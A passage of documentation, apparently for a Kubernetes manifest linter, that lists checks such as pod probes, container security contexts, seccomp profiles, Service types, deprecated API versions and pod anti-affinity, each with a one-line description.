Makes sure that all NetworkPolicies targets at least one Pod

## pod-probes

Makes sure that all Pods have safe probe configurations

## container-security-context

Makes sure that all pods have good securityContexts configured

## container-seccomp-profile

Makes sure that all pods have at a seccomp policy configured.

## service-targets-pod

Makes sure that all Services targets a Pod

## service-type

Makes sure that the Service type is not NodePort

## stable-version

Checks if the object is using a deprecated apiVersion

## deployment-has-host-podantiaffinity

Makes sure that a podAntiAffinity has been set that prevents multiple pods from being scheduled on the same node. [Docs](https://kubernetes.io/docs/concepts/configuration/assign-pod-node/)

## statefulset-has-host-podantiaffinity

Makes sure that a podAntiAffinity has been set that prevents multiple pods from being scheduled on the same node. [Docs](https://kubernetes.io/docs/concepts/configuration/assign-pod-node/)

## label-values

Validates label values

## horizontalpodautoscaler-has-target

Makes sure that the HPA targets a valid object
